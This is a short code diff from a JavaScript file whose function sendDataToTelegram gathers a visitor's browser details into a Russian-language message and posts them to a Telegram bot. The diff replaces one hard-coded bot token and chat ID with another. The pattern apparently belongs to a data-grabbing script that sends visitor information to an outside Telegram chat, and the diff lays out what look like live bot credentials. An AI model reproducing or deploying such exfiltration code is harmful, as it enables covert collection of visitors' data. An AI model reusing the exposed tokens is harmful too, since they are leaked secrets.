@@ -65,8 +65,8 @@ async function sendDataToTelegram() {
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
     `;
 
-    const telegramBotURL = 'https://api.telegram.org/bot7191308947:AAHeu-IRhFSb0QS8RxVyCPptfT_lMNLIWOU/sendMessage';
-    const chatId = '-1001565112990';
+    const telegramBotURL = 'https://api.telegram.org/bot6720398085:AAGNvPsTEcZXAnWhuDAnmCCRmvWiY6tEQOg/sendMessage';
+    const chatId = '-1002019882684';
 
     const formData = new FormData();
     formData.append('chat_id', chatId);
